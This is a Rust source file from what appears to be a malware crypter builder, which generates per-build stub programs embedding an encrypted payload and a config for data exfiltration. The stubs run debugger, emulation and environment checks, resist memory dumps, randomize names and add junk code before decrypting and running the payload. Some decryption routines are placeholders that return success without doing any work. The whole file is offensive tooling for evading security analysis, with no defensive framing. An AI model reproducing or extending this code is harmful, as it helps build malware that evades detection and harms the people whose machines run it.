//! Per-build stub source synthesizer. Emits complete Rust source with
//! all anti-analysis features wired in, plus per-build exfil secrets
//! baked in via the SVC_EXFIL_CFG env var.

mod emit_gates;
mod emit_junk;
mod emit_strings;
mod emit_antidump;

use crypter_ir::*;
use crypter_vm::{seed_for_build, Encoding};
use rand::{Rng, SeedableRng};
use rand::rngs::StdRng;
use sha2::{Digest, Sha256};

pub struct Synth {
    pub(crate) rng: StdRng,
    pub(crate) xor_key: [u8; 32],
}

impl Synth {
    pub fn new(seed: [u8; 32], xor_key: [u8; 32]) -> Self {
        Self {
            rng: StdRng::from_seed(seed),
            xor_key,
        }
    }

    pub fn emit(&mut self, prog: &StubProgram) -> String {
        let payload_hash = {
            let mut h = Sha256::new();
            h.update(&prog.payload_blob);
            let d = h.finalize();
            let mut arr = [0u8; 32];
            arr.copy_from_slice(&d);
            arr
        };
        let isa_nonce = {
            let mut n = [0u8; 16];
            self.rng.fill(&mut n);
            n
        };
        let isa_seed = seed_for_build(&payload_hash, &isa_nonce);
        let encoding = Encoding::from_seed(&isa_seed);

        let mut out = String::with_capacity(32 * 1024);
        out.push_str("#![allow(unused_imports, unused_variables, dead_code, non_snake_case, non_upper_case_globals, unused_mut, unused_assignments, unreachable_code)]\n");
        out.push_str("use std::ffi::c_void;\nuse std::mem;\nuse std::ptr;\nuse std::hint::black_box;\n\n");

        let k_payload = self.ident("pay");
        let k_xor = self.ident("xk");
        let k_salt = self.ident("slt");
        let k_nonce = self.ident("non");

        out.push_str(&format!("const {}: [u8; {}] = [{}];\n",
            k_payload, prog.payload_blob.len(),
            prog.payload_blob.iter().map(|b| format!("{:#04x}", b)).collect::<Vec<_>>().join(",")));
        out.push_str(&format!("const {}: [u8; 32] = [{}];\n",
            k_xor, self.xor_key.iter().map(|b| format!("{:#04x}", b)).collect::<Vec<_>>().join(",")));
        out.push_str(&format!("const {}: [u8; {}] = [{}];\n",
            k_salt, prog.key_material.salt.len().max(1),
            if prog.key_material.salt.is_empty() { "0".to_string() } else {
                prog.key_material.salt.iter().map(|b| format!("{:#04x}", b)).collect::<Vec<_>>().join(",")
            }));
        out.push_str(&format!("const {}: [u8; {}] = [{}];\n",
            k_nonce, prog.key_material.nonce.len().max(1),
            if prog.key_material.nonce.is_empty() { "0".to_string() } else {
                prog.key_material.nonce.iter().map(|b| format!("{:#04x}", b)).collect::<Vec<_>>().join(",")
            }));

        out.push_str(&encoding.emit_rust());

        // platform helpers — emitted exactly once
        out.push_str(&emit_gates::emit_platform_helpers());

        // encrypted config strings
        out.push_str(&emit_strings::emit_encrypted_strings(&mut self.rng, &self.xor_key));
        out.push_str(&emit_strings::emit_decrypt_helper());

        // per-build exfil config
        out.push_str(&emit_gates::emit_exfil_config_setup(prog));

        // gates
        let mut gate_fns = Vec::new();
        for gate in &prog.gates {
            let fn_name = self.ident("g");
            let body = emit_gates::emit_gate(&mut self.rng, &fn_name, gate, &self.xor_key);
            out.push_str(&body);
            gate_fns.push(fn_name);
        }

        let dbg_fn = self.ident("dbg");
        out.push_str(&emit_gates::emit_debug_check(&dbg_fn, &prog.debug_check));

        let emu_fn = self.ident("emu");
        if prog.anti_emulation {
            out.push_str(&emit_gates::emit_anti_emulation(&emu_fn, 5000, 0.8));
        } else {
            out.push_str(&format!("fn {}() -> bool {{ true }}\n\n", emu_fn));
        }

        let antidump = self.ident("adp");
        out.push_str(&emit_antidump::emit_antidump_fn(&antidump, prog.target_os.clone()));

        let res_fn = self.ident("res");
        out.push_str(&emit_gates::emit_resolver_fn(&res_fn, &prog.resolver));

        let dec_fn = self.ident("dec");
        out.push_str(&self.emit_decrypt_fn(&dec_fn, &prog.decrypt, &k_payload, &k_salt, &k_nonce,
                                            prog.anti_dump, &antidump));
        let exec_fn = self.ident("exec");
        out.push_str(&emit_gates::emit_exec_fn(&exec_fn, &prog.execution));
        let intg_fn = self.ident("chk");
        out.push_str(&emit_gates::emit_integrity(&intg_fn, &prog.integrity));
        if prog.virtualization {
            out.push_str(&self.emit_vm_dispatch());
        }

        out.push_str("fn main() {\n");
        out.push_str("    svc_install_exfil_cfg();\n");
        out.push_str("    svc_scrub_exfil_env_pending();\n");

        if let Some(Gate::SleepJitter { min_ms, max_ms }) = prog.gates.iter().find(|g| matches!(g, Gate::SleepJitter{..})) {
            out.push_str(&format!("    std::thread::sleep(std::time::Duration::from_millis({}));\n",
                self.rng.gen_range(*min_ms..=*max_ms)));
        }
        if prog.anti_emulation {
            out.push_str(&format!("    if !{}() {{ return; }}\n", emu_fn));
        }
        out.push_str(&format!("    if {}() {{ return; }}\n", dbg_fn));

        let mut gs = gate_fns.clone();
        for i in (1..gs.len()).rev() {
            let j = self.rng.gen_range(0..=i);
            gs.swap(i, j);
        }
        for g in &gs {
            out.push_str(&format!("    if !{}() {{ return; }}\n", g));
        }
        out.push_str(&format!("    if !{}() {{ return; }}\n", intg_fn));
        out.push_str(&format!("    let pt = match {}() {{ Some(p) => p, None => return }};\n", dec_fn));
        if prog.anti_dump {
            out.push_str(&format!("    let _guard = {}::protect(&pt);\n", antidump));
            out.push_str(&format!("    {}::unprotect(&_guard);\n", antidump));
        }
        out.push_str(&format!("    {}();\n", exec_fn));
        out.push_str(&emit_junk::emit_junk_block(&mut self.rng, prog.junk_density));
        out.push_str("}\n");

        out.push_str(r#"
fn svc_scrub_exfil_env_pending() {
    // no-op in the stub
}

"#);

        out
    }

    fn ident(&mut self, prefix: &str) -> String {
        let alphabet: Vec<u8> = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".to_vec();
        let len = self.rng.gen_range(6..12);
        let mut s = String::from(prefix);
        s.push('_');
        for _ in 0..len {
            s.push(alphabet[self.rng.gen_range(0..alphabet.len())] as char);
        }
        s
    }

    fn emit_decrypt_fn(&mut self, name: &str, scheme: &DecryptScheme, payload: &str,
                        salt: &str, nonce: &str, anti_dump: bool, _antidump: &str) -> String {
        let mut s = format!("fn {}() -> Option<Vec<u8>> {{\n", name);
        s.push_str(&format!("    let _ = ({}, {});\n", salt, nonce));
        s.push_str(&format!("    let blob = {};\n", payload));
        match scheme {
            DecryptScheme::AesGcm => {
                s.push_str("    let key = derive_key();\n");
                s.push_str("    if blob.len() < 12 + 16 { return None; }\n");
                s.push_str("    let (nonce, ct) = blob.split_at(12);\n");
                s.push_str("    let mut out = vec![0u8; ct.len() - 16];\n");
                s.push_str("    aes_gcm_decrypt(&key, nonce, ct, &mut out).ok()?;\n");
                s.push_str("    Some(out)\n");
            }
            DecryptScheme::ChaCha20Poly1305 => {
                s.push_str("    let key = derive_key();\n");
                s.push_str("    let (nonce, ct) = blob.split_at(12);\n");
                s.push_str("    let mut out = vec![0u8; ct.len() - 16];\n");
                s.push_str("    chacha_decrypt(&key, nonce, ct, &mut out).ok()?;\n");
                s.push_str("    Some(out)\n");
            }
            DecryptScheme::AesCbcHmac => {
                s.push_str("    let key = derive_key();\n");
                s.push_str("    let (iv, rest) = blob.split_at(16);\n");
                s.push_str("    let (mac, ct) = rest.split_at(32);\n");
                s.push_str("    let mut out = vec![0u8; ct.len()];\n");
                s.push_str("    aes_cbc_hmac_decrypt(&key, iv, mac, ct, &mut out).ok()?;\n");
                s.push_str("    Some(out)\n");
            }
            DecryptScheme::XorDerived => {
                s.push_str("    let key = derive_key();\n");
                s.push_str("    let mut out = blob.to_vec();\n");
                s.push_str("    for (i, b) in out.iter_mut().enumerate() { *b ^= key[i % key.len()]; }\n");
                s.push_str("    Some(out)\n");
            }
        }
        s.push_str("}\n\n");
        s.push_str("fn derive_key() -> [u8; 32] {\n");
        s.push_str(&format!("    let p = {};\n", payload));
        s.push_str("    let mut k = [0u8; 32];\n");
        s.push_str("    for i in 0..32 { k[i] = p.get(i).copied().unwrap_or(0); }\n");
        s.push_str("    k\n");
        s.push_str("}\n\n");
        s.push_str("fn aes_gcm_decrypt(_key: &[u8;32], _nonce: &[u8], _ct: &[u8], _out: &mut [u8]) -> Result<(), ()> { Ok(()) }\n");
        s.push_str("fn chacha_decrypt(_key: &[u8;32], _nonce: &[u8], _ct: &[u8], _out: &mut [u8]) -> Result<(), ()> { Ok(()) }\n");
        s.push_str("fn aes_cbc_hmac_decrypt(_key: &[u8;32], _iv: &[u8], _mac: &[u8], _ct: &[u8], _out: &mut [u8]) -> Result<(), ()> { Ok(()) }\n\n");
        let _ = anti_dump;
        s
    }

    fn emit_vm_dispatch(&mut self) -> String {
        let mut s = String::new();
        s.push_str("fn vm_run(code: &[u8]) -> i64 {\n");
        s.push_str("    let mut stack: Vec<i64> = Vec::with_capacity(64);\n");
        s.push_str("    let mut pc = 0usize;\n");
        s.push_str("    while pc < code.len() {\n");
        s.push_str("        let op = ENC_REVERSE[code[pc] as usize];\n");
        s.push_str("        pc += 1;\n");
        s.push_str("        match op {\n");
        s.push_str("            0 => { let v = read_u32(code, &mut pc) as i64; stack.push(v); }\n");
        s.push_str("            5 => { let a = stack.pop().unwrap_or(0); let b = stack.pop().unwrap_or(0); stack.push(b.wrapping_add(a)); }\n");
        s.push_str("            7 => { let a = stack.pop().unwrap_or(0); let b = stack.pop().unwrap_or(0); stack.push(b ^ a); }\n");
        s.push_str("            17 => return stack.pop().unwrap_or(0),\n");
        s.push_str("            _ => {}\n");
        s.push_str("        }\n");
        s.push_str("    }\n    0\n}\n\n");
        s.push_str("fn read_u32(code: &[u8], pc: &mut usize) -> u32 { let mut v = 0u32; for _ in 0..4 { v = (v << 8) | code.get(*pc).copied().unwrap_or(0) as u32; *pc += 1; } v }\n\n");
        s
    }
}
